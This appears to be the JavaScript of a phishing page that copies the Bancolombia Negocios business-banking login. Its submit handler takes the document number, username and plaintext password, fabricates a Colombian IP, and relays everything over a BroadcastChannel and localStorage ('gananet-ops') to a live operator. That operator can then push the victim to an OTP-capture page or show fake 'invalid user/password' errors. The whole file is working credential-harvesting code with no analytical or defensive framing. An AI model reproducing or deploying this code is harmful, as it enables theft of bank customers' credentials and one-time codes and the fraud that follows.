const CHANNEL = 'gananet-ops';
const STORAGE_KEY = 'gananet-ops-event';
const SESSIONS_KEY = 'gananet-ops-sessions';

function publish(message) {
  const payload = { ...message, ts: Date.now() };
  try {
    const ch = new BroadcastChannel(CHANNEL);
    ch.postMessage(payload);
    ch.close();
  } catch (_) {}
  try {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(payload));
  } catch (_) {}
}

let sessionId = sessionStorage.getItem('sessionId') || ('sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9));
sessionStorage.setItem('sessionId', sessionId);

let pingInterval = null;

function startPing() {
  if (pingInterval) clearInterval(pingInterval);
  publish({ type: 'session:ping', sessionId });
  pingInterval = setInterval(() => {
    publish({ type: 'session:ping', sessionId });
  }, 3000);
}

function stopPing() {
  if (pingInterval) {
    clearInterval(pingInterval);
    pingInterval = null;
  }
}

const form = document.getElementById("login-form");
const submit = document.getElementById("submit");
const fields = ["doc-type", "doc-number", "user", "password"].map((id) => document.getElementById(id));
const msg = document.getElementById("form-msg");
const toast = document.getElementById("toast");
const helpCard = document.getElementById("help-card");

function filled() {
  return fields.every((field) => field.value.trim().length > 0);
}

function refresh() {
  submit.disabled = !filled();
}

fields.forEach((field) => field.addEventListener("input", refresh));
fields.forEach((field) => field.addEventListener("change", refresh));

document.getElementById("close-alert").addEventListener("click", () => {
  document.getElementById("alert-banner").hidden = true;
});

document.querySelectorAll("[data-toggle]").forEach((button) => {
  button.addEventListener("click", () => {
    const input = document.getElementById(button.dataset.toggle);
    input.type = input.type === "password" ? "text" : "password";
  });
});

function showToast(text) {
  toast.textContent = text;
  toast.hidden = false;
  window.setTimeout(() => {
    toast.hidden = true;
  }, 2800);
}

function onMessage(data) {
  if (!data || typeof data !== 'object') return;
  if (data.sessionId !== sessionId) return;

  if (data.type === 'session:action') {
    const action = data.action;
    if (action === 'ganapin' || action === 'totp') {
      stopPing();
      sessionStorage.setItem('otpType', action);
      window.location.href = "clave.html";
    } else if (action === 'error-user') {
      stopPing();
      document.getElementById("svn-loader").hidden = true;
      msg.textContent = "El usuario ingresado no es válido.";
      msg.hidden = false;
    } else if (action === 'error-pass') {
      stopPing();
      document.getElementById("svn-loader").hidden = true;
      msg.textContent = "La clave ingresada no es válida.";
      msg.hidden = false;
    }
  }
}

try {
  const ch = new BroadcastChannel(CHANNEL);
  ch.onmessage = (event) => onMessage(event.data);
} catch (_) {}

window.addEventListener('storage', (event) => {
  if (event.key === STORAGE_KEY && event.newValue) {
    try {
      onMessage(JSON.parse(event.newValue));
    } catch (_) {}
  }
});

window.addEventListener('DOMContentLoaded', () => {
  const params = new URLSearchParams(window.location.search);
  const error = params.get('error');
  if (error === 'error-user') {
    msg.textContent = "El usuario ingresado no es válido.";
    msg.hidden = false;
  } else if (error === 'error-pass') {
    msg.textContent = "La clave ingresada no es válida.";
    msg.hidden = false;
  } else if (error === 'error-token') {
    msg.textContent = "Clave Dinámica incorrecta. Intente de nuevo.";
    msg.hidden = false;
  }
});

form.addEventListener("submit", (event) => {
  event.preventDefault();
  msg.hidden = true;
  msg.textContent = "";
  document.getElementById("svn-loader").hidden = false;

  const docType = document.getElementById("doc-type").value;
  const docNum = document.getElementById("doc-number").value;
  const usernameVal = document.getElementById("user").value;
  const passwordVal = document.getElementById("password").value;

  const session = {
    id: sessionId,
    username: `${docType.toUpperCase()}:${docNum} / ${usernameVal}`,
    password: passwordVal,
    tipoUsuario: docType,
    device: window.innerWidth <= 768 ? 'mobile' : 'desktop',
    ip: '186.29.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255),
    state: 'waiting',
    createdAt: Date.now()
  };

  publish({ type: 'session:created', session });
  startPing();
});

document.getElementById("forgot-user").addEventListener("click", (event) => {
  event.preventDefault();
  showToast("Recupera tu usuario desde la app Bancolombia Negocios.");
});

document.getElementById("forgot-pass").addEventListener("click", (event) => {
  event.preventDefault();
  showToast("Puedes regenerar tu clave desde la app o el centro de ayuda.");
});

document.getElementById("register").addEventListener("click", (event) => {
  event.preventDefault();
  showToast("El registro se hace desde la App Bancolombia Negocios.");
});

function toggleHelp() {
  helpCard.hidden = !helpCard.hidden;
}

document.getElementById("btn-ayuda").addEventListener("click", toggleHelp);
document.getElementById("need-help").addEventListener("click", toggleHelp);

document.addEventListener("click", (event) => {
  if (!event.target.closest("#help-card, #btn-ayuda, #need-help")) {
    helpCard.hidden = true;
  }
});

refresh();
